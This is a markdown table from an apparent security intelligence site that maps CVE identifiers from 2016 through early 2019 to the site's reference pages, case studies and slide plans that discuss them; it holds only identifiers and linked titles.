| [CVE-2016-6367](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-6367) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/slides/plans/NSA_CIA_TOOL_LEAKS.md), [Slide plan: The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/slides/plans/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2016-7255](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-7255) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [Slide plan: The Year 2016 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2016.md) |
| [CVE-2016-7855](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-7855) | [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [Slide plan: The Year 2016 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2016.md) |
| [CVE-2016-9079](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-9079) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2016 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2016.md), [Slide plan: The Year 2016 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2016.md) |
| [CVE-2016-10174](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2016-10174) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2017-0005](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0005) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md) |
| [CVE-2017-0101](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0101) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-0143](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0143) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [Cyber Operations as Statecraft: The Cases in The Hacker and the State](/case-studies/HACKER_AND_THE_STATE_CASES.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Year 2017 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2017.md), [Slide plan: United States-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_UNITED_STATES.md) |
| [CVE-2017-0144](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0144) | [CVE Reference Guide](/CVE_REFERENCE.md), [Security Glossary](/GLOSSARY.md), [Internet-Facing Services and External Exposure](/INTERNET_FACING_SERVICES_REFERENCE.md), [Network Attacks Reference](/NETWORK_ATTACKS_REFERENCE.md), [Network Protocols Security Reference](/NETWORK_PROTOCOLS_SECURITY.md), [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [Cyber Operations as Statecraft: The Cases in The Hacker and the State](/case-studies/HACKER_AND_THE_STATE_CASES.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Sandworm: The Operations in the Public Record](/case-studies/SANDWORM_OPERATIONS.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: The Year 2017 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2017.md), [Slide plan: Cyber Operations as Statecraft: The Cases in The Hacker and the State](/case-studies/slides/plans/HACKER_AND_THE_STATE_CASES.md), [Slide plan: The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/slides/plans/NSA_CIA_TOOL_LEAKS.md), [Slide plan: Sandworm: The Operations in the Public Record](/case-studies/slides/plans/SANDWORM_OPERATIONS.md), [Slide plan: The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/slides/plans/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2017-0145](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0145) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [Sandworm: The Operations in the Public Record](/case-studies/SANDWORM_OPERATIONS.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md), [Slide plan: Sandworm: The Operations in the Public Record](/case-studies/slides/plans/SANDWORM_OPERATIONS.md) |
| [CVE-2017-0146](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0146) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2017-0147](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0147) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2017-0148](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0148) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [Cyber Operations as Statecraft: The Cases in The Hacker and the State](/case-studies/HACKER_AND_THE_STATE_CASES.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [United States-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_UNITED_STATES.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2017-0199](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0199) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: The Year 2017 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2017.md) |
| [CVE-2017-0210](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0210) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-0213](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0213) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-0261](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-0261) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-3881](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-3881) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/slides/plans/NSA_CIA_TOOL_LEAKS.md) |
| [CVE-2017-5638](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-5638) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [Slide plan: The Year 2017 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2017.md) |
| [CVE-2017-5715](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-5715) | [Hardware Security Reference](/HARDWARE_SECURITY_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2017-5753](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-5753) | [Hardware Security Reference](/HARDWARE_SECURITY_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2017-5754](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-5754) | [Hardware Security Reference](/HARDWARE_SECURITY_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2017-6334](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-6334) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2017-6736](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-6736) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2017-6742](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-6742) | [The Year 2023 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2023.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: Russia-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2017-6862](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-6862) | [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2017-6884](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-6884) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-7269](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-7269) | [The Shadow Brokers and Vault 7: The NSA and CIA Tool Leaks, 2016 to 2017](/case-studies/NSA_CIA_TOOL_LEAKS.md), [The Zero-Day Trade and Its Fallout: The Events in This Is How They Tell Me the World Ends](/case-studies/ZERO_DAY_MARKET_EVENTS.md) |
| [CVE-2017-7494](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-7494) | [Enterprise Infrastructure Reference](/ENTERPRISE_INFRASTRUCTURE.md), [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-7921](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-7921) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2017-8291](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-8291) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-8464](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-8464) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-8570](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-8570) | [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2017-8759](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-8759) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [Slide plan: The Year 2017 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2017.md) |
| [CVE-2017-9822](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-9822) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-10271](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-10271) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-11292](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-11292) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-11357](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-11357) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-11774](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-11774) | [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md) |
| [CVE-2017-11826](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-11826) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-11882](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-11882) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [APT41: The Public Record, 2012 to 2026](/case-studies/APT41_PUBLIC_RECORD.md), [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: The Year 2017 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2017.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md), [Slide plan: Other State-Linked Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2017-12149](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-12149) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-12615](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-12615) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2017-12617](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-12617) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2017-17562](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-17562) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md) |
| [CVE-2017-18362](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-18362) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2017-1000253](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2017-1000253) | [The Year 2017 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2017.md) |
| [CVE-2018-0171](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-0171) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [Telecom & 5G Security Reference](/TELECOM_5G_SECURITY_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: The Year 2018 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2018.md), [Slide plan: China-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_CHINA.md), [Slide plan: Russia-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_RUSSIA.md) |
| [CVE-2018-0296](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-0296) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2018-0798](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-0798) | [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2018-0802](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-0802) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2018-2628](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-2628) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-4063](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-4063) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2018-4878](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-4878) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-6789](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-6789) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-7600](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-7600) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: The Year 2018 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2018.md) |
| [CVE-2018-7602](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-7602) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-8120](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8120) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-8174](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8174) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [Slide plan: The Year 2018 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2018.md) |
| [CVE-2018-8373](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8373) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-8414](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8414) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2018-8440](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8440) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-8453](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8453) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-8581](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8581) | [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [Slide plan: The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/slides/plans/MANDIANT_INTRUSION_2020.md) |
| [CVE-2018-8589](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8589) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-8611](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8611) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-8653](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-8653) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-9276](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-9276) | [HackTheBox Machine Index](/research/HTB_MACHINE_INDEX.md) |
| [CVE-2018-10561](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-10561) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-10562](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-10562) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-11776](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-11776) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [Slide plan: The Year 2018 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2018.md) |
| [CVE-2018-13379](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-13379) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [The Year 2020 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2020.md), [The Year 2021 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2021.md), [The Year 2022 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2022.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/SOLARWINDS_SUNBURST.md), [Iran-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_IRAN.md), [Russia-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_RUSSIA.md), [Slide plan: The Year 2018 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2018.md), [Slide plan: The Year 2019 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2019.md), [Slide plan: The Year 2020 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2020.md), [Slide plan: The Year 2022 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2022.md), [Slide plan: The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/slides/plans/RANSOMWARE_ECOSYSTEM.md), [Slide plan: SolarWinds and SUNBURST: The Supply-Chain Intrusion, 2019 to 2021](/case-studies/slides/plans/SOLARWINDS_SUNBURST.md), [Slide plan: Iran-Attributed Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_IRAN.md) |
| [CVE-2018-13382](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-13382) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2018-13383](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-13383) | [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md) |
| [CVE-2018-14634](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-14634) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/MICROSOFT_OFFICE_CVE_2026_21509.md) |
| [CVE-2018-14847](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-14847) | [Firmware & IoT Security Reference](/FIRMWARE_IOT_SECURITY_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2018-15961](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-15961) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [The FireEye Mandiant Intrusion of 2020: The Public Record](/case-studies/MANDIANT_INTRUSION_2020.md) |
| [CVE-2018-15982](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-15982) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [Slide plan: The Year 2018 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2018.md) |
| [CVE-2018-20062](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-20062) | [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md) |
| [CVE-2018-20250](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-20250) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2018 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2018.md), [The Year 2019 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2019.md), [Slide plan: The Year 2018 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2018.md) |
| [CVE-2018-20753](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2018-20753) | [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2019-0344](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2019-0344) | [E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/ECOMMERCE_THREATS.md) |
